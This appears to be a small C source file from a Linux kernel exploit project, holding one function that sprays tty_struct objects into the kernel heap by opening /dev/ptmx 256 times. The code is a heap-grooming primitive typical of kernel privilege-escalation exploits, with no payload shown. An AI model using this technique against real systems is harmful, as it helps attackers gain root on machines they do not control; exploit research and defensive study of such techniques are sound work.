
#include "heap.h"


#define SPRAY_SZ 0x200

void spray_tty_struct(){
    int spray[SPRAY_SZ];

    LOG("Spraying tty_structs");
    for(int i = 0; i < SPRAY_SZ / 2; i++) {
        spray[i] = open("/dev/ptmx" , O_RDONLY | O_NOCTTY);
        if(spray[i] == -1) {
            __asm__("int3");
        }
    }
}

